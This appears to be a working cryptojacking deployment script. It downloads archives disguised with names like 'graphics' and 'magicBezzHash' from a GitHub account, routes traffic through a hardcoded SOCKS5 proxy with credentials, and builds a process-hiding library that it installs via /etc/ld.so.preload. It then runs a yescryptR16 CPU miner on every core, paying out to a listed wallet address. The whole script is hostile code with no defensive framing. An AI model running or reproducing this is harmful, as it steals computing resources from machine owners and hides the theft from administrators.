#!/bin/sh

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 188.74.182.55:8068

socks5_username = ingfoingfo

socks5_password = maszZeehh

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

echo ""

echo " "

echo " "

./graftcp/graftcp wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz

tar -xf cpuminer-opt-linux.tar.gz

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip

unzip magicBezzHash.zip

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./cpuminer-avx -a yescryptR16 -o stratum+tcp://yescryptR16.asia.mine.zergpool.com:6333 -u REBCKtxqipVbjjtvs8cjcrjXTnD8YmJY4d -p  c=RVN,mc=QOGE,ID=Tukiman -t $(nproc)
